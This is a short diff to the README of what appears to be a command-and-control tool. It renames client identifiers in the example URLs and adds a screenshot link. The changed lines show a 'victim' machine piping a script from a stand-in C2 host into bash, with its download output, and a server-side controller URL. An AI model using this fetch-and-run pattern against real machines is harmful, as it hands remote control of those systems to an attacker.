@@ -24,11 +24,13 @@ In order for requests to be routed to the c2 backend either the hostname or the 
 
 `victim`
 ```bash
-user@victim:~$ curl https://c2client1.example.com/runme.sh | bash
+user@victim:~$ curl https://c2id11211.example.com/runme.sh | bash
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                Dload  Upload   Total   Spent    Left  Speed
 100   458  100   458    0     0   1721      0 --:--:-- --:--:-- --:--:--  1721
 ```
 
 `server`
-https://c2.example.com/client1/controller.html
+https://c2.example.com/id11211/controller.html
+
+![screenshot from 2019-01-23 11-45-03](https://user-images.githubusercontent.com/3729326/51615460-d33dca00-1f1f-11e9-948c-98135358c620.png)
